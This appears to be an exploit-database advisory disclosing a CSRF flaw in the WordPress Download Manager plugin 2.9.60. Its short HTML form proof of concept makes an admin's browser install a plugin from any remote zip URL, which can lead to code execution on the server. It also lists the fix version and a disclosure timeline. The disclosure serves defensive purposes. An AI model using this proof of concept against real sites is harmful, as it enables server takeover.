@@ -1,0 +1,57 @@
+* Exploit Title: WordPress Download Manager [CSRF]
+* Discovery Date: 2017-12-12
+* Exploit Author: Panagiotis Vagenas
+* Author Link: https://twitter.com/panVagenas
+* Vendor Homepage: https://www.wpdownloadmanager.com/
+* Software Link: https://wordpress.org/plugins/download-manager
+* Version: 2.9.60
+* Tested on: WordPress 4.9.1
+* Category: WebApps, WordPress
+
+
+Description
+-----------
+
+Plugin implements the AJAX action `wpdm-install-addon` which calls the
+function `wpdm_install_addon`. This function doesn't take any anti-CSRF
+measures thus making it susceptible to those kind of attacks.
+
+What is interesting about this function though, is the fact that it
+provides plugin installation functionality for admin users. The origin of
+the package is defined by the `$_REQUEST['addon']` if is set without any
+validation.
+
+A malicious actor can exploit this to install a malicious plugin in the
+vulnerable site. In fact the install package doesn't need to be a valid
+plugin, it could just contain malicious code. Because the package is
+extracted in the `/wp-content/plugins/` dir without changing it's original
+folder structure, an attacker could leverage the CSRF to upload malicious
+code and execute the code on the infected server.
+
+PoC
+---
+
+```
+<pre class="lang:html decode:true "><form method="post" action="http://vuln.dev/wp-admin/admin-ajax.php">
+    <input type="hidden" name="action" value="wpdm-install-addon">
+    <label> This is the remote url to get plugin from. Everything is valid as long as it's a ZIP archive and ends with .zip
+        <input type="text" name="addon" value="https://downloads.wordpress.org/plugin/bbpress.2.5.13.zip">
+    </label>
+    <button type="submit" value="Submit">Submit</button>
+</form>
+
+```
+
+Solution
+--------
+
+Update to version 2.9.61.
+
+Timeline
+--------
+
+1. **2017-12-12**: Discovered
+2. **2017-12-14**: Tried to reach out to vendor using support email address
+3. **2017-12-16**: Vendor replied
+4. **2017-12-16**: Vendor received details
+5. **2017-12-21**: Vendor released a fix
